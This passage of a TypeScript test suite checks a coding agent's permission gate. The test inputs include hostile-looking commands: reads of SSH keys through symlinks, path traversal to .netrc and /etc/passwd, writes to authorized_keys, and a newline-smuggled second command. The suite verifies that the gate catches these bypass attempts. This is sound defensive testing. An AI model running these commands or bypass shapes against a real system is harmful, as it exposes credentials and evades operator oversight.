		await expectAllowed(harness, ctx, "bash", { command: "rg pattern src" });
		await expectAllowed(harness, ctx, "bash", { command: "rg --files" });
		await expectAllowed(harness, ctx, "bash", { command: "du -sh ." });
	});

	await check("redirects: /dev/null and 2>&1 fine, in-project log fine, outside target escalates (A.3/A.4)", async () => {
		const ctx = makeCtx(wtProject);
		await expectAllowed(harness, ctx, "bash", { command: "npm test > /dev/null 2>&1" });
		await expectAllowed(harness, ctx, "bash", { command: "echo hi > /dev/null" });
		await expectAllowed(harness, ctx, "bash", { command: "npm test > test-run.log" });
		await expectAllowed(harness, ctx, "bash", { command: "npm test 2>> test-run.log" });
		await expectDialog(harness, ctx, "bash", { command: "npm test > /tmp/out.log" });
		await expectDialog(harness, ctx, "bash", { command: "echo hi >> ~/.cache/herdr-driver/log" });
	});

	await check("redirect targets must be plain single-link files (A4/B7)", async () => {
		const ctx = makeCtx(wtProject);
		const a = path.join(wtProject, "redir-a.txt");
		writeFileSync(a, "data");
		linkSync(a, path.join(wtProject, "redir-hard.txt"));
		await expectDialog(harness, ctx, "bash", { command: "echo x > redir-hard.txt" });
		writeFileSync(path.join(wtProject, "redir-plain.txt"), "data");
		await expectAllowed(harness, ctx, "bash", { command: "echo x > redir-plain.txt" });
		writeFileSync(path.join(wtProject, "redir-real.txt"), "data");
		symlinkSync(path.join(wtProject, "redir-real.txt"), path.join(wtProject, "redir-link.txt"));
		await expectDialog(harness, ctx, "bash", { command: "echo x > redir-link.txt" });
	});

	await check("unquoted $VAR in redirect targets or path tokens asks; single-quoted $ is fine (B4)", async () => {
		const ctx = makeCtx(wtProject);
		await expectDialog(harness, ctx, "bash", { command: "echo x > $TMPDIR/evil" });
		await expectDialog(harness, ctx, "bash", { command: "cat $TMPDIR/x" });
		await expectDialog(harness, ctx, "bash", { command: 'echo x > "$TMPDIR/evil"' });
		await expectAllowed(harness, ctx, "bash", { command: "echo '$TMPDIR' > literal.log" });
		await expectAllowed(harness, ctx, "bash", { command: "grep '$1' src/a.ts" });
	});

	await check("non-trivial quoting fails closed to a dialog (B3/R2)", async () => {
		const ctx = makeCtx(wtProject);
		// The B3 example: '$PWD/..' sits inside double quotes, so the old
		// single-quote strip hid the expansion from containsUnquotedDollar.
		await expectDialog(harness, ctx, "bash", { command: 'cat "x\'$PWD/..\'y"' });
		// Internal/unbalanced quotes and adjacent quoted fragments.
		await expectDialog(harness, ctx, "bash", { command: 'cat a"b"c' });
		await expectDialog(harness, ctx, "bash", { command: 'echo x > "a"b' });
		await expectDialog(harness, ctx, "bash", { command: 'echo x > "my log.txt"' });
		await expectDialog(harness, ctx, "bash", { command: 'echo x > \'ab\'' });
		// Whole-token pairs stay fine.
		await expectAllowed(harness, ctx, "bash", { command: 'git commit -m "x # y"' });
		await expectAllowed(harness, ctx, "bash", { command: "sed -n '10,20p' src/a.ts" });
		await expectAllowed(harness, ctx, "bash", { command: "echo '$TMPDIR' > literal.log" });
	});

	await check("read-only segments are allowed and tokens may not escape via symlinks into protected paths", async () => {
		const ctx = makeCtx(wtProject);
		await expectAllowed(harness, ctx, "bash", { command: "ls -la" });
		await expectAllowed(harness, ctx, "bash", { command: "cat src/main.ts | grep foo" });
		mkdirSync(path.join(fakeHome, ".ssh"), { recursive: true });
		symlinkSync(path.join(fakeHome, ".ssh"), path.join(wtProject, "ssh-link"), "dir");
		await expectDialog(harness, ctx, "bash", { command: "cat ssh-link/config" });
		await expectDialog(harness, ctx, "bash", { command: "cat .git" });
		await expectDialog(harness, ctx, "bash", { command: `cat ${path.join(mainRepo, ".git", "config")}` });
	});

	await check("relative path tokens that escape lexically ask (B2)", async () => {
		const ctx = makeCtx(wtProject);
		await expectDialog(harness, ctx, "bash", { command: "cat x/../../.zsh_history" });
		await expectDialog(harness, ctx, "bash", { command: "cat ./../.netrc" });
		await expectDialog(harness, ctx, "bash", { command: "git diff --no-index x/../../etc/passwd /dev/null" });
		// Plain in-project relative paths stay allowed (no fail-closed regression).
		await expectAllowed(harness, ctx, "bash", { command: "cat src/main.ts" });
		await expectAllowed(harness, ctx, "bash", { command: "cat ./src/main.ts" });
	});

	await check("read through an in-project symlink into a protected root asks (B5)", async () => {
		const project = freshProjectDir();
		writePolicy(project, seatAutoPolicy(project));
		mkdirSync(path.join(project, "src"), { recursive: true });
		writeFileSync(path.join(project, "src", "x.ts"), "export {};");
		mkdirSync(path.join(fakeHome, ".ssh"), { recursive: true });
		writeFileSync(path.join(fakeHome, ".ssh", "id_rsa"), "secret");
		symlinkSync(path.join(fakeHome, ".ssh"), path.join(project, "ssh-read-link"), "dir");
		const ctx = makeCtx(project);
		await expectDialog(harness, ctx, "read", { path: "ssh-read-link/id_rsa" });
		await expectDialog(harness, ctx, "read", { path: "ssh-read-link" });
		await expectAllowed(harness, ctx, "read", { path: "src/x.ts" });
	});

	await check("protected-path reads never ride stored readOutsideProject grants (A1/B4)", async () => {
		mkdirSync(path.join(fakeHome, ".ssh"), { recursive: true });
		const protectedRead = path.join(realpathSync(fakeHome), ".ssh", "id_rsa");
		writeFileSync(protectedRead, "secret");
		// seatAuto + stored project grant: the read gate must decide, not the grant.
		const seatProject = freshProjectDir();
		writePolicy(seatProject, seatAutoPolicy(seatProject, { permissions: { readOutsideProject: "allow" } }));
		await expectDialog(harness, makeCtx(seatProject), "read", { path: protectedRead });
		// ask mode + stored project grant: the gate runs in every mode. (pi
		// expands a leading ~ before the tool runs, so the absolute path here is
		// exactly what `read ~/.ssh/id_rsa` delivers.)
		const askProject = freshProjectDir();
		writePolicy(askProject, { projectPath: askProject, updatedAt: new Date().toISOString(), mode: "ask", permissions: { readOutsideProject: "allow" } });
		await expectDialog(harness, makeCtx(askProject), "read", { path: protectedRead });
		// Same outcome through an in-project symlink into a protected dir.
		const linkProject = freshProjectDir();
		writePolicy(linkProject, seatAutoPolicy(linkProject, { permissions: { readOutsideProject: "allow" } }));
		symlinkSync(path.join(fakeHome, ".ssh"), path.join(linkProject, "ssh-link"), "dir");
		await expectDialog(harness, makeCtx(linkProject), "read", { path: "ssh-link/id_rsa" });
		// An ordinary outside read still works via the stored grant.
		const outsideFile = path.join(realpathSync(fakeHome), "plain-note.txt");
		writeFileSync(outsideFile, "ok");
		await expectAllowed(harness, makeCtx(seatProject), "read", { path: outsideFile });
	});

	await check("yolo: protected-path reads ask instead of auto-allow (A1/B4)", async () => {
		mkdirSync(path.join(fakeHome, ".ssh"), { recursive: true });
		const protectedRead = path.join(realpathSync(fakeHome), ".ssh", "id_rsa");
		writeFileSync(protectedRead, "secret");
		const project = freshProjectDir();
		writePolicy(project, { projectPath: project, updatedAt: new Date().toISOString(), mode: "yolo", permissions: {} });
		symlinkSync(path.join(fakeHome, ".ssh"), path.join(project, "ssh-link"), "dir");
		const ctx = makeCtx(project);
		await expectDialog(harness, ctx, "read", { path: protectedRead });
		await expectDialog(harness, ctx, "read", { path: "ssh-link/id_rsa" });
		// Non-protected outside reads stay yolo-allowed.
		const outsideFile = path.join(realpathSync(fakeHome), "plain-yolo.txt");
		writeFileSync(outsideFile, "ok");
		await expectAllowed(harness, makeCtx(project), "read", { path: outsideFile });
	});

	// -----------------------------------------------------------------------
	// Hard-deny vs stored grants (A.1 + N6)
	// -----------------------------------------------------------------------

	await check("hard-deny commands bypass stored project grants; allowed shapes use them", async () => {
		const project = freshProjectDir();
		writePolicy(project, seatAutoPolicy(project));
		const grantingCtx = makeCtx(project, { selectResult: "Allow permanently for this project" });
		// git stash list is not allowlisted, so the operator stores a git:allow.
		const first = await harness.toolCall({ toolName: "bash", input: { command: "git stash list" }, toolCallId: nextId() }, grantingCtx);
		assert.equal(first, undefined, "the dialog resolves with Allow permanently, so the call goes through");
		assert.equal(grantingCtx.dialogs.length, 1, "exactly one dialog for git stash list");
		assert.equal((readPolicy(project).permissions as Record<string, string>).git, "allow", "the grant should be stored");

		const ctx = makeCtx(project);
		// The stored git:allow covers non-hard-denied git without a dialog.
		await expectAllowed(harness, ctx, "bash", { command: "git stash list" });
		// ...but a hard-deny command must reach the operator even with the grant (N6).
		await expectDialog(harness, ctx, "bash", { command: "git push" });
	});

	await check("hard-deny commands bypass stored session grants (N6)", async () => {
		const project = freshProjectDir();
		writePolicy(project, seatAutoPolicy(project));
		const grantingCtx = makeCtx(project, { selectResult: "Allow for current session" });
		const first = await harness.toolCall({ toolName: "bash", input: { command: "rm -f one.txt" }, toolCallId: nextId() }, grantingCtx);
		assert.equal(first, undefined, "the first rm -f goes through via the session grant");
		assert.equal(grantingCtx.dialogs.length, 1, "the first rm -f needed the dialog");
		// Session grant for destructiveBash is now stored; a second rm -f must
		// still reach the operator because isYoloHardDenied patterns never reach
		// any allow path (A.1).
		await expectDialog(harness, makeCtx(project), "bash", { command: "rm -f two.txt" });
	});

	await check("stored writeFiles grants cannot bypass protected-path checks in any mode (B3)", async () => {
		const protectedTarget = path.join(realpathSync(fakeHome), ".ssh", "authorized_keys");
		// seatAuto + stored project grant: seatAuto's checks must decide, not the grant.
		const seatProject = freshProjectDir();
		writePolicy(seatProject, seatAutoPolicy(seatProject, { permissions: { writeFiles: "allow" } }));
		await expectDialog(harness, makeCtx(seatProject), "write", { path: protectedTarget, content: "x" });
		// ask mode + stored project grant: same hard rule in every mode.
		const askProject = freshProjectDir();
		writePolicy(askProject, { projectPath: askProject, updatedAt: new Date().toISOString(), mode: "ask", permissions: { writeFiles: "allow" } });
		await expectDialog(harness, makeCtx(askProject), "write", { path: protectedTarget, content: "x" });
	});

	await check("in seatAuto stored writeFiles grants cannot bypass symlink/nlink checks (B3)", async () => {
		const project = freshProjectDir();
		writePolicy(project, seatAutoPolicy(project, { permissions: { writeFiles: "allow" } }));
		const realFile = path.join(project, "real.txt");
		writeFileSync(realFile, "x");
		const linkPath = path.join(project, "swap-link.txt");
		symlinkSync(realFile, linkPath);
		// The stored project grant must not decide: seatAuto denies the symlink.
		await expectDialog(harness, makeCtx(project), "write", { path: linkPath, content: "y" });
		// Store a session grant via the dialog on the same symlinked target...
		const ctxSession = makeCtx(project, { selectResult: "Allow for current session" });
		await harness.toolCall({ toolName: "write", input: { path: linkPath, content: "z" }, toolCallId: nextId() }, ctxSession);
		assert.equal(ctxSession.dialogs.length, 1, "seatAuto denies the symlinked target, so the dialog stored a session grant");
		// ...the session grant must not let a follow-up symlinked write through.
		await expectDialog(harness, makeCtx(project), "write", { path: linkPath, content: "w" });
	});

	await check("operator-typed ! commands are not subject to seatAuto allows (N6)", async () => {
		const ctx = makeCtx(wtProject);
		const result = (await harness.userBash({ command: "npm test", cwd: wtProject }, ctx)) as { result?: { exitCode?: number } };
		assert.equal(ctx.dialogs.length, 1, "user_bash must not use the seatAuto bash allowlist");
		assert.equal(result?.result?.exitCode, 1);
	});

	// -----------------------------------------------------------------------
	// Other modes keep their behaviour
	// -----------------------------------------------------------------------

	await check("yolo: rm -f still denied outright, extended hard-deny denies without dialog, rest allowed", async () => {
		const project = freshProjectDir();
		writePolicy(project, { projectPath: project, updatedAt: new Date().toISOString(), mode: "yolo", permissions: {} });
		const ctx = makeCtx(project);
		const rmResult = await harness.toolCall({ toolName: "bash", input: { command: "rm -f x.txt" }, toolCallId: nextId() }, ctx);
		assert.equal((rmResult as { block?: boolean }).block, true);
		assert.equal(ctx.dialogs.length, 0, "yolo hard-deny denies outright without a dialog");
		const pushResult = await harness.toolCall({ toolName: "bash", input: { command: "git push" }, toolCallId: nextId() }, ctx);
		assert.equal((pushResult as { block?: boolean }).block, true, "extended hard-deny set applies in yolo too (A.1: every mode)");
		assert.equal(ctx.dialogs.length, 0, "yolo denies hard-deny categories outright");
		await expectAllowed(harness, ctx, "bash", { command: "touch y.txt" });
	});

	await check("ask mode is unchanged: everything asks", async () => {
		const project = freshProjectDir();
		writePolicy(project, { projectPath: project, updatedAt: new Date().toISOString(), mode: "ask", permissions: {} });
		const ctx = makeCtx(project);
		await expectDialog(harness, ctx, "bash", { command: "npm test" });
		await expectDialog(harness, ctx, "write", { path: path.join(project, "x.txt"), content: "hi" });
	});

	await check("readOnlyAuto gains the strict N1 shapes", async () => {
		const project = freshProjectDir();
		writePolicy(project, { projectPath: project, updatedAt: new Date().toISOString(), mode: "readOnlyAuto", permissions: {} });
		const ctx = makeCtx(project);
		await expectAllowed(harness, ctx, "bash", { command: "ls -la" });
		await expectAllowed(harness, ctx, "bash", { command: "sed -n '1p' f.txt" });
		await expectDialog(harness, ctx, "bash", { command: "awk '{print $1}' f.txt" });
		await expectDialog(harness, ctx, "bash", { command: "sed 's/a/b/' f.txt" });
		// Newline is a separator: a smuggled second line must not inherit the
		// first line's read-only shape.
		await expectDialog(harness, ctx, "bash", { command: "ls\ntouch x" });
	});

	// -----------------------------------------------------------------------
	// A.5 — unknown fields preserved + schemaVersion
	// -----------------------------------------------------------------------

	await check("hd-written unknown fields survive a mode toggle and an Allow permanently save (A.5)", async () => {
		const project = freshProjectDir();
		const unknown = { vendorFoo: { bar: [1, 2, 3] }, seatExtra: "keep-me" };
		const policy = seatAutoPolicy(project, { ...unknown });
		writePolicy(project, policy);

		// Mode toggle via the permissions command.
		const permissions = harness.command("permissions");
		if (!permissions) throw new Error("extension did not register the permissions command");
		await permissions("mode read-only", makeCtx(project));
		let saved = readPolicy(project);
		assert.equal(saved.mode, "readOnlyAuto");
		assert.deepEqual(saved.vendorFoo, unknown.vendorFoo, "unknown field vendorFoo must survive verbatim");
		assert.equal(saved.seatExtra, "keep-me", "unknown field seatExtra must survive verbatim");
		assert.equal(saved.schemaVersion, 2, "schemaVersion must be present after a save");
		assert.ok(saved.seat && (saved.seat as Record<string, unknown>).expiresAt, "seat block must survive verbatim");

		// "Allow permanently" save on top.
		const ctx = makeCtx(project, { selectResult: "Allow permanently for this project" });
		const result = await harness.toolCall({ toolName: "bash", input: { command: "touch x.txt" }, toolCallId: nextId() }, ctx);
		assert.equal(result, undefined, "the dialog opens (read-only mode blocks touch) and the grant allows it");
		assert.equal(ctx.dialogs.length, 1, "exactly one dialog for touch");
		saved = readPolicy(project);
		assert.deepEqual(saved.vendorFoo, unknown.vendorFoo, "unknown field vendorFoo must survive the permanent save");
		assert.equal(saved.seatExtra, "keep-me");
		assert.equal((saved.permissions as Record<string, string>).bashCommands, "allow");
		assert.equal(saved.schemaVersion, 2);
		assert.ok(saved.seat && (saved.seat as Record<string, unknown>).expiresAt, "seat block must survive the permanent save");
	});

	await check("pendingSeatWrites past the limit fails closed instead of evicting a guard (B9)", async () => {
		// Drain guards armed by earlier scenarios so the limit is exact.
		for (let id = 1; id <= callCounter; id++) {
			await harness.toolResult({ toolCallId: `call-${id}`, toolName: "write", isError: false, content: [] }, makeCtx(wtProject));
		}
		const project = freshProjectDir();
		writePolicy(project, seatAutoPolicy(project));
		const ctx = makeCtx(project);
		for (let i = 0; i < 64; i++) {
			await expectAllowed(harness, ctx, "write", { path: path.join(project, `fill-${i}.txt`), content: "x" });
		}
		// The 65th armed write would evict a guard under the old LRU: ask instead.
		await expectDialog(harness, ctx, "write", { path: path.join(project, "overflow.txt"), content: "x" });
		// Settling one write frees a guard slot again.
		await harness.toolResult({ toolCallId: `call-${callCounter - 1}`, toolName: "write", isError: false, content: [] }, makeCtx(project));
		await expectAllowed(harness, ctx, "write", { path: path.join(project, "after-drain.txt"), content: "x" });
	});
}

main().catch((error) => {
	console.error(error);
	process.exit(1);
});